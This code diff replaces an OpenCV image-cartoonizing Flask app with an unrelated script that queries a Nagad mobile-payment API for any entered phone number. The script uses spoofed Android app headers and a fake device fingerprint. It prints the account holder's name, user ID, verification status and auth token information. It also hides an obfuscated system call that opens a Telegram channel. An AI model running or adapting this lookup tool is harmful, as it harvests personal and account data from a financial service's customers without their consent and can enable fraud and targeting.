@@ -1,52 +1,80 @@
-from flask import Flask, request, render_template, redirect, url_for
-import cv2
-import numpy as np
 import os
+from os import system as Unknown_X05
+try:
+    import requests
+except:
+    Unknown_X05('pip install requests')
+    import requests
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+ 
+bgreen="\033[1;32m"       # Green
+bblue="\033[1;34m"        # Blue
+bcyan="\033[1;36m"        # Cyan
+bwhite="\033[1;37m"       # White
+logo = f'''
 
-app = Flask(__name__)
-app.config['UPLOAD_FOLDER'] = 'uploads'
-app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg', 'jpeg'}
+{bcyan} _        _  _  _  ____  
+( (    /|(  _  )(   \(  _  )(  __  \ 
+{bwhite}|  \  (  (   )  (    \/| (   ) || (  \  )
+|   \ |  (_)  |      | (_) || |   ) |
+| (\ \)   _   |  |  _  || |   | |
+{bblue}| | \    (   )  | \_  )| (   ) || |   ) |
+| )  \   )   (  (_)  )   (  (/  )
+|/    )_)|/     \|(_)|/     \|(____/ 
+                                             
+{bwhite}
+'''
+def SUYAIB():
+    print(logo)
+# ANSI color codes
 
-# Ensure the uploads directory exists
-os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+url = "https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in"
 
-def allowed_file(filename):
-    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']
+def DarkTeamTermuxExploration():
+    os.system('clear')
+    SUYAIB()
+    Unknown_X05('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n'+' '+'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'t'+'.'+'m'+'e'+'/'+'D'+'a'+'r'+'k'+'T'+'e'+'a'+'m'+'T'+'e'+'r'+'m'+'u'+'x'+'E'+'x'+'p'+'l'+'o'+'r'+'a'+'t'+'i'+'o'+'n')
+    suyaib = input("<\\\> ENTER NAGAD NUMBER : ")
+    params = {
+        'msisdn': suyaib
+        }
+    headers = {
+    'X-KM-User-AspId': '100012345612345',
+    'X-KM-User-Agent': 'ANDROID/1164',
+    'X-KM-DEVICE-FGP': '5AB18952A962A31MM9A89524F6282F78905DDE9F94656B5C1CFCEDNN74AE660E',
+    'X-KM-Accept-language': 'bn',
+    'X-KM-AppCode': '01',
+    'Host': 'app2.mynagad.com:20002',
+    'Connection': 'Keep-Alive',
+    'Accept-Encoding': 'gzip',
+    'User-Agent': 'okhttp/3.14.9'
+    }
 
-def convert(image_path):
-    original_image = cv2.imread(image_path)
-    Gray_image = cv2.cvtColor(original_image, cv2.COLOR_BGR2GRAY)
-    Blur_image = cv2.GaussianBlur(Gray_image, (3, 3), 0)
-    detect_edge = cv2.adaptiveThreshold(Blur_image, 255,
-                                        cv2.ADAPTIVE_THRESH_MEAN_C, cv2.THRESH_BINARY, 5, 5)
+    response = requests.get(url, headers=headers, params=params)
 
-    output = cv2.bitwise_and(original_image, original_image, mask=detect_edge)
-
-    output_path = os.path.join(app.config['UPLOAD_FOLDER'], 'output.png')
-    cv2.imwrite(output_path, output)
-
-    return output_path
-
-@app.route('/', methods=['GET', 'POST'])
-def upload_file():
-    if request.method == 'POST':
-        if 'file' not in request.files:
-            return redirect(request.url)
-        file = request.files['file']
-        if file.filename == '' or not allowed_file(file.filename):
-            return redirect(request.url)
+    if response.status_code == 200:
+        data = response.json()
         
-        file_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
-        file.save(file_path)
-        
-        output_image_path = convert(file_path)
-        return redirect(url_for('display_image', filename='output.png'))
+        # Print each field separately with colors
+        print(f"\n\n\n    {bcolors.HEADER}Name: {bcolors.OKGREEN}{data.get('name')}{bcolors.ENDC}")
+        print(f"    {bcolors.HEADER}User ID: {bcolors.OKBLUE}{data.get('userId')}{bcolors.ENDC}")
+        print(f"    {bcolors.HEADER}Status: {bcolors.OKCYAN}{data.get('status')}{bcolors.ENDC}")
+        print(f"    {bcolors.HEADER}User Type: {bcolors.WARNING}{data.get('userType')}{bcolors.ENDC}")
+        print(f"    {bcolors.HEADER}RB Base: {bcolors.OKGREEN}{data.get('rbBase')}{bcolors.ENDC}")
+        print(f"    {bcolors.HEADER}Auth Token Info: {bcolors.FAIL}{data.get('authTokenInfo')}{bcolors.ENDC}")
+        print(f"    {bcolors.HEADER}Verification Status: {bcolors.OKCYAN}{data.get('verificationStatus')}{bcolors.ENDC}")
+        print(f"    {bcolors.HEADER}Execution Status: {bcolors.WARNING}{data.get('executionStatus')}{bcolors.ENDC}\n\n\n")
+        print("[=] Press enter for back \>>")
+    else:
+        print(f"{bcolors.FAIL}Error: {response.status_code}, {response.text}{bcolors.ENDC}")
 
-    return render_template('upload.html')
-
-@app.route('/display/<filename>')
-def display_image(filename):
-    return render_template('display.html', filename=filename)
-
-if __name__ == '__main__':
-    app.run(debug=True)
+DarkTeamTermuxExploration()
